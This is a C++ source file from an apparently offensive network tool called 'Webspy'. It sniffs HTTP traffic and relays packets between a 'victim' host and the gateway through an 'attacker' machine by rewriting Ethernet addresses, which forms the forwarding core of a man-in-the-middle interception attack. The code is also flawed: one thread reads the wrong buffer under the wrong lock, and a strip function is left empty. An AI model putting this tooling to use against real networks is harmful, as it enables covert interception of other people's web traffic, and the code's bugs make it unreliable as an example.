/*
 * Pipe.cpp
 *
 *  Created on: 01/06/2015
 *      Author: Felipe Rodopoulos
 */

#include "Pipe.h"

Pipe::Pipe(Host& src, Host& dst) : src(src), dst(dst){}

Pipe::~Pipe() { }

void Pipe::init(){
	pthread_t snifferThread, victimThread, gatewayThread, renderThread;
	Crafter *victimCrafter  = new Crafter(Globals::iface);
	Crafter *gatewayCrafter = new Crafter(Globals::iface);
	Crafter *renderCrafter  = new Crafter(Globals::iface);

	if(pthread_create(&snifferThread, nullptr, connect, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}

	if(pthread_create(&victimThread, nullptr, routeToVictim, (void*)victimCrafter) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init victim relayer thread\n");
		exit(EXIT_FAILURE);
	}

	if(pthread_create(&gatewayThread, nullptr, routeToGateway, (void*)gatewayCrafter) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init gateway relayer thread\n");
		exit(EXIT_FAILURE);
	}

}

void* Pipe::connect(void* args){
	char filter[] = "tcp port 80";
	Sniffer sniffer(filter);

	sniffer.listen(relay);

	printf("Sai do listen\n");
	return nullptr;
}

void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet){
	Ethernet* ether = (Ethernet*) packet;
	if(!memcmp(Globals::attacker.mac, ether->thaddr, 6)){
		Packet rcvdPacket = new Packet(packet, header->len);

		IP* ip = (IP*) (packet + 14);
		if(ip->src == Globals::victim.ip){
			pthread_mutex_lock(&victimMutex);
			Globals::victimBuffer.push(rcvdPacket);
			pthread_mutex_unlock(&victimMutex);
		} else if(ip->src == Globals::gateway.ip){
			pthread_mutex_lock(&gatewayMutex);
			Globals::gatewayBuffer.push(rcvdPacket);
			pthread_mutex_unlock(&gatewayMutex);
		}
	}
}

void* Pipe::routeToVictim(void* args){
	while(1 == 1){
		if(!Globals::victimBuffer.empty()){
			pthread_mutex_lock(&victimMutex);
			Packet packet = Globals::victimBuffer.front();
			Globals::victimBuffer.pop();
			pthread_mutex_unlock(&victimMutex);

			Ethernet* ether = (Ethernet*) packet;
			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(ether->thaddr, Globals::victim.mac->ether_addr_octet, 6);

			Crafter* crafter = (Crafter*) args;
			crafter->sendRaw(packet);
		}
	}
}

void* Pipe::routeToGateway(void* args){
	while(1 == 1){
		if(!Globals::victimBuffer.empty()){
			pthread_mutex_lock(&gatewayMutex);
			Packet packet = Globals::victimBuffer.front();
			Globals::victimBuffer.pop();
			pthread_mutex_unlock(&gatewayMutex);

			Ethernet* ether = (Ethernet*) packet;
			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(ether->thaddr, Globals::gateway.mac->ether_addr_octet, 6);

			Crafter* crafter = (Crafter*) args;
			crafter->sendRaw(packet);
		}
	}
}

void strip(){

}
